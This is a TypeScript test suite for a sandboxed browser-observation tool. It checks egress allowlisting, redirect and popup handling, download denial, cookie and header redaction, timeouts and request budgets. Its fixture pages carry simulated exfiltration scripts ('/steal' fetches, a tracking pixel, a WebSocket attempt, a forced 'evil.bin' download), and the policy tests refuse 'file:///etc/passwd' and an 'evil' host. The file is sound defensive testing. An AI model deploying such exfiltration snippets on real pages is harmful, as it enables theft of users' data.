import { after, before, describe, it } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { parseEvidence } from "@rtk/evidence";
import { ChromiumNotFoundError, PolicyError, findChromium, observePage, parseHostRule, decide } from "../src/index.ts";
import { sha256 } from "../src/policy.ts";

const chromium = findChromium();
const skip = chromium ? false : "no Chromium found (set RTK_CHROMIUM_PATH or install under /opt/pw-browsers)";
const nr = (e: { normalized_result: unknown }): any => e.normalized_result;
const profiles = () => readdirSync(tmpdir()).filter((n) => n.startsWith("rtk-browser-profile-")).sort();

const INLINE = `eval("document.title='from-eval'");`;
const hits = { external: [] as string[], allowed: [] as string[], main: [] as string[], ws: 0, hang: 0 };
let main: http.Server, external: http.Server, allowed: http.Server, mp = 0, ep = 0, ap = 0;
const listen = (s: http.Server) => new Promise<number>((r) => s.listen(0, "127.0.0.1", () => r((s.address() as AddressInfo).port)));
const html = (r: http.ServerResponse, body: string, headers: Record<string, string | string[]> = {}) => { r.writeHead(200, { "content-type": "text/html", ...headers }); r.end(body); };
const hangSockets = new Set<import("node:net").Socket>();

before(async () => {
  external = http.createServer((q, r) => { hits.external.push(q.url ?? ""); r.end("external"); });
  external.on("upgrade", (_q, s) => { hits.ws++; s.destroy(); });
  allowed = http.createServer((q, r) => { hits.allowed.push(q.url ?? ""); r.writeHead(200, { "access-control-allow-origin": "*", "access-control-allow-headers": "*" }); r.end("allowed-data"); });
  ep = await listen(external); ap = await listen(allowed);
  main = http.createServer((q, r) => {
    const u = new URL(q.url ?? "/", "http://x");
    hits.main.push(u.pathname);
    switch (u.pathname) {
      case "/external": return html(r, `<title>ext</title><script>
        fetch('http://127.0.0.1:${ep}/steal?x=1').catch(()=>console.error('ext-fetch-failed'));
        fetch('http://localhost:${ep}/steal2').catch(()=>{});
        new Image().src='http://127.0.0.1:${ep}/pixel.gif';
        try { new WebSocket('ws://127.0.0.1:${ep}/ws'); } catch (e) {}
      </script>`);
      case "/eval": return html(r, `<title>t</title><script>${INLINE}</script><script src="/app.js"></script>`);
      case "/app.js": r.writeHead(200, { "content-type": "text/javascript" }); return void r.end("window.__x = atob('YQ==');");
      case "/r1": r.writeHead(302, { location: "/r2" }); return void r.end();
      case "/r2": r.writeHead(301, { location: "/final" }); return void r.end();
      case "/final": return html(r, "<title>final</title>done");
      case "/redir-ext": r.writeHead(302, { location: `http://127.0.0.1:${ep}/landed` }); return void r.end();
      case "/popup": return html(r, `<title>p</title><script>window.open('/popped')</script>`);
      case "/popped": return html(r, "<title>popped</title>");
      case "/dl": r.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": 'attachment; filename="evil.bin"' }); return void r.end("BINARY");
      case "/download": return html(r, `<title>d</title><script>const a=document.createElement('a');a.href='/dl';a.download='evil.bin';document.body.appendChild(a);a.click();</script>`);
      case "/allowed": return html(r, `<title>a</title><script>fetch('http://127.0.0.1:${ap}/data').then(r=>r.text()).then(t=>{document.title=t})</script>`);
      case "/console": return html(r, `<title>c</title><script>console.log('hello');console.error('bad thing');throw new Error('uncaught boom')</script>`);
      case "/dialog": return html(r, `<title>dlg</title><script>alert('a1');confirm('c1');prompt('p1','d')</script>`);
      case "/cookie": return html(r, `<title>ck</title><script>localStorage.setItem('ls-key','v');sessionStorage.setItem('ss-key','v')</script>`, { "set-cookie": ["sid=SUPERSECRETCOOKIE; Path=/; HttpOnly", "pref=dark; Path=/"], "content-security-policy": "default-src 'self' 'unsafe-inline' 'unsafe-eval' http://127.0.0.1:*", "x-frame-options": "DENY" });
      case "/headers": return html(r, `<title>h</title><script>fetch('http://127.0.0.1:${ap}/data',{headers:{Authorization:'Bearer TOPSECRETTOKEN','X-Custom':'visible-val'}}).catch(()=>{})</script>`, { "set-cookie": "tracker=TRACKSECRET; Path=/" });
      case "/hang": hangSockets.add(q.socket); hits.hang++; return; // never responds
      case "/many": return html(r, `<title>m</title>` + Array.from({ length: 12 }, (_, i) => `<script>fetch('http://127.0.0.1:${ap}/n${i}')</script>`).join(""));
      case "/ws": return html(r, "<title>ws</title>");
      default: r.writeHead(404); return void r.end("nf");
    }
  });
  mp = await listen(main);
});
after(() => { for (const s of hangSockets) s.destroy(); main.close(); external.close(); allowed.close(); });

const U = (p: string) => `http://127.0.0.1:${mp}${p}`;
const MAIN_ONLY = () => [`127.0.0.1:${mp}`];

describe("policy helpers", () => {
  it("host rules and decisions", () => {
    const rules = ["127.0.0.1:8080", "localhost", "[::1]"].map(parseHostRule);
    assert.equal(decide("http://127.0.0.1:8080/x", rules).allowed, true);
    assert.equal(decide("http://127.0.0.1:8081/x", rules).allowed, false);
    assert.equal(decide("http://localhost:9/x", rules).allowed, true);
    assert.equal(decide("http://[::1]:5/x", rules).allowed, true);
    assert.equal(decide("https://evil.example.invalid/", rules).reason, "not-in-egress-allowlist");
    assert.equal(decide("file:///etc/passwd", rules).allowed, false);
    assert.equal(decide("ftp://localhost/x", rules).allowed, false);
    assert.equal(decide("data:text/plain,hi", rules).allowed, true);
    assert.throws(() => parseHostRule("http://x"), /invalid allowHosts/);
  });
  it("refuses a non-allowlisted target and a missing chromium without launching", async () => {
    await assert.rejects(observePage("http://example.invalid/", {}), PolicyError);
    await assert.rejects(observePage("file:///etc/passwd", {}), PolicyError);
    await assert.rejects(observePage("http://127.0.0.1:1/", { executablePath: "/nonexistent/chrome" }), ChromiumNotFoundError);
  });
});

describe("observation (requires Chromium)", { skip }, () => {
  it("blocks and logs egress to non-allowlisted hosts; the external server is never contacted", async () => {
    const e = await observePage(U("/external"), { allowHosts: MAIN_ONLY() });
    const n = nr(e);
    assert.deepEqual(hits.external, [], "external server must receive no request");
    assert.equal(hits.ws, 0, "no websocket upgrade reached external");
    const blocked = n.blocked_requests.map((b: any) => b.url);
    assert.ok(blocked.some((u: string) => u.includes(`127.0.0.1:${ep}/steal?x=1`)));
    assert.ok(blocked.some((u: string) => u.includes(`localhost:${ep}/steal2`)));
    assert.ok(blocked.some((u: string) => u.includes("/pixel.gif")));
    assert.ok(n.blocked_requests.every((b: any) => b.reason === "not-in-egress-allowlist"));
    assert.ok(n.websockets.some((w: any) => w.decision === "blocked"));
    assert.ok(n.console.some((c: any) => c.text === "ext-fetch-failed"));
    assert.equal(n.profile.removed, true);
  });

  it("evidence envelope: provider, operation, honest isolation, sandbox limitation, authenticated id", async () => {
    const e = await observePage(U("/final"), { allowHosts: MAIN_ONLY() });
    assert.equal(e.operation, "observe_web_page"); assert.equal(e.provider.id, "rtk-browser-observer");
    assert.equal(e.environment!.isolation, "process");
    assert.equal(e.confidence, "observed");
    assert.match(e.limitations[0], /sandbox/i);
    if (process.getuid?.() === 0) { assert.match(e.limitations[0], /--no-sandbox/); assert.equal(nr(e).browser.os_sandbox, false); }
    assert.ok(e.limitations.some((l) => l.includes("@rtk/sandbox")));
    assert.equal(e.subject!.digest.sha256, sha256("<title>final</title>done"), "subject = main document body sha256");
    parseEvidence(JSON.parse(JSON.stringify(e)));
  });

  it("records inline + external scripts (url, sha256, size, inline flag) and eval indicator; eval ran", async () => {
    const n = nr(await observePage(U("/eval"), { allowHosts: MAIN_ONLY() }));
    const inline = n.scripts.find((s: any) => s.inline);
    assert.equal(inline.sha256, sha256(INLINE)); assert.equal(inline.bytes, INLINE.length);
    assert.ok(inline.indicators.includes("eval")); assert.equal(inline.url, null);
    const ext = n.scripts.find((s: any) => !s.inline);
    assert.equal(ext.url, U("/app.js")); assert.equal(ext.sha256, sha256("window.__x = atob('YQ==');")); assert.ok(ext.indicators.includes("atob"));
    assert.equal(n.title, "from-eval");
  });

  it("records the redirect chain; a redirect to a non-allowlisted host is blocked, not followed", async () => {
    const n = nr(await observePage(U("/r1"), { allowHosts: MAIN_ONLY() }));
    assert.deepEqual(n.redirect_chain.map((r: any) => [new URL(r.url).pathname, r.status]), [["/r1", 302], ["/r2", 301], ["/final", 200]]);
    assert.equal(n.redirect_chain[0].location, "/r2");
    assert.equal(n.summary.redirects, 2);
    assert.equal(n.final_url, U("/final"));
    const n2 = nr(await observePage(U("/redir-ext"), { allowHosts: MAIN_ONLY() }));
    assert.deepEqual(hits.external, []);
    assert.ok(n2.blocked_requests.some((b: any) => b.url.endsWith("/landed")));
    assert.ok(n2.requests.find((r: any) => r.url.endsWith("/landed")).redirected_from.endsWith("/redir-ext"));
    assert.equal(n2.navigation.status, null);
    assert.ok(n2.navigation.error);
  });

  it("closes and records popups", async () => {
    const n = nr(await observePage(U("/popup"), { allowHosts: MAIN_ONLY() }));
    assert.equal(n.popups.length, 1);
    assert.equal(n.popups[0].url, U("/popped")); assert.equal(n.popups[0].action, "closed");
  });

  it("denies downloads and records them", async () => {
    const before = profiles();
    const n = nr(await observePage(U("/download"), { allowHosts: MAIN_ONLY() }));
    assert.ok(n.downloads.length >= 1);
    assert.ok(n.downloads.every((d: any) => d.action === "denied"));
    assert.ok(n.downloads.some((d: any) => d.suggested_filename === "evil.bin"));
    assert.deepEqual(profiles(), before);
  });

  it("auto-dismisses dialogs and records them", async () => {
    const n = nr(await observePage(U("/dialog"), { allowHosts: MAIN_ONLY() }));
    assert.deepEqual(n.dialogs.map((d: any) => [d.type, d.message, d.action]), [["alert", "a1", "dismissed"], ["confirm", "c1", "dismissed"], ["prompt", "p1", "dismissed"]]);
    assert.equal(n.dialogs[2].default_value, "d");
  });

  it("allows an allowlisted localhost origin and records it", async () => {
    hits.allowed.length = 0;
    const n = nr(await observePage(U("/allowed"), { allowHosts: [...MAIN_ONLY(), `127.0.0.1:${ap}`] }));
    assert.deepEqual(hits.allowed, ["/data"]);
    const r = n.requests.find((q: any) => q.url === `http://127.0.0.1:${ap}/data`);
    assert.equal(r.decision, "allowed"); assert.equal(r.status, 200);
    assert.equal(n.title, "allowed-data");
    // same page without the second origin allowlisted: blocked and never contacted
    hits.allowed.length = 0;
    const n2 = nr(await observePage(U("/allowed"), { allowHosts: MAIN_ONLY() }));
    assert.deepEqual(hits.allowed, []);
    assert.equal(n2.blocked_requests.length, 1);
  });

  it("default policy is loopback-only (any port)", async () => {
    hits.allowed.length = 0;
    const n = nr(await observePage(U("/allowed")));
    assert.deepEqual(hits.allowed, ["/data"]);
    assert.equal(n.summary.blocked, 0);
  });

  it("records console messages and uncaught errors", async () => {
    const n = nr(await observePage(U("/console"), { allowHosts: MAIN_ONLY() }));
    assert.ok(n.console.some((c: any) => c.type === "log" && c.text === "hello"));
    assert.ok(n.console.some((c: any) => c.type === "error" && c.text === "bad thing"));
    assert.ok(n.console.some((c: any) => c.type === "pageerror" && c.text.includes("uncaught boom")));
    assert.equal(n.summary.console_errors, 2);
  });

  it("records cookies (values redacted), storage keys and security headers", async () => {
    const e = await observePage(U("/cookie"), { allowHosts: MAIN_ONLY() });
    const n = nr(e);
    const sid = n.cookies.find((c: any) => c.name === "sid");
    assert.equal(sid.httpOnly, true); assert.equal(sid.value, "[REDACTED]"); assert.equal(sid.value_length, "SUPERSECRETCOOKIE".length);
    assert.ok(n.cookies.some((c: any) => c.name === "pref"));
    assert.ok(!JSON.stringify(e).includes("SUPERSECRETCOOKIE"), "secret cookie value must not appear anywhere in the Evidence");
    assert.deepEqual(n.storage.local_storage_keys, ["ls-key"]); assert.deepEqual(n.storage.session_storage_keys, ["ss-key"]);
    assert.equal(n.security_headers.main_document.present["x-frame-options"], "DENY");
    assert.match(n.security_headers.main_document.present["content-security-policy"], /default-src/);
    assert.ok(n.security_headers.main_document.missing.includes("strict-transport-security"));
    const main = n.requests[0];
    assert.equal(main.response_headers["set-cookie"], "[REDACTED]");
    const withVals = nr(await observePage(U("/cookie"), { allowHosts: MAIN_ONLY(), includeCookieValues: true }));
    assert.equal(withVals.cookies.find((c: any) => c.name === "sid").value, "SUPERSECRETCOOKIE");
  });

  it("redacts Authorization / Cookie / Set-Cookie header values; redaction list is configurable", async () => {
    const opts = { allowHosts: [...MAIN_ONLY(), `127.0.0.1:${ap}`] };
    const e = await observePage(U("/headers"), opts);
    const s = JSON.stringify(e);
    assert.ok(!s.includes("TOPSECRETTOKEN")); assert.ok(!s.includes("TRACKSECRET"));
    const call = nr(e).requests.find((r: any) => r.url === `http://127.0.0.1:${ap}/data`);
    assert.equal(call.request_headers.authorization, "[REDACTED]");
    assert.equal(call.request_headers["x-custom"], "visible-val");
    const e2 = await observePage(U("/headers"), { ...opts, redactHeaders: ["x-custom"] });
    const c2 = nr(e2).requests.find((r: any) => r.url === `http://127.0.0.1:${ap}/data`);
    assert.equal(c2.request_headers["x-custom"], "[REDACTED]");
    assert.equal(c2.request_headers.authorization, "Bearer TOPSECRETTOKEN", "only configured names are redacted");
  });

  it("enforces the hard timeout and still cleans up", async () => {
    const before = profiles();
    const t0 = Date.now();
    const e = await observePage(U("/hang"), { allowHosts: MAIN_ONLY(), timeoutMs: 2500 });
    const dt = Date.now() - t0;
    assert.ok(dt < 9000, `returned in ${dt}ms`);
    assert.ok(hits.hang >= 1, "page was actually requested");
    const n = nr(e);
    assert.equal(n.navigation.timed_out, true);
    assert.ok(e.limitations.some((l) => l.includes("hard timeout")));
    assert.equal(n.profile.removed, true); assert.equal(n.profile.leftover_processes, 0);
    assert.deepEqual(profiles(), before);
  });

  it("enforces the max-requests budget", async () => {
    hits.allowed.length = 0;
    const e = await observePage(U("/many"), { allowHosts: [...MAIN_ONLY(), `127.0.0.1:${ap}`], maxRequests: 5 });
    const n = nr(e);
    assert.equal(n.budgets.requests_exceeded, true);
    assert.ok(n.blocked_requests.some((b: any) => b.reason === "max-requests"));
    assert.ok(n.summary.allowed <= 5);
    assert.ok(hits.allowed.length <= 4, `allowed server saw ${hits.allowed.length}`);
    assert.ok(e.limitations.some((l) => l.includes("max-requests")));
  });

  it("enforces the max-bytes budget", async () => {
    hits.allowed.length = 0;
    const e = await observePage(U("/many"), { allowHosts: [...MAIN_ONLY(), `127.0.0.1:${ap}`], maxBytes: 100 });
    assert.equal(nr(e).budgets.bytes_exceeded, true);
    assert.ok(e.limitations.some((l) => l.includes("max-bytes")));
  });

  it("removes the temporary profile on exit (success path)", async () => {
    const before = profiles();
    const e = await observePage(U("/final"), { allowHosts: MAIN_ONLY() });
    assert.equal(nr(e).profile.removed, true);
    assert.deepEqual(profiles(), before);
  });
});
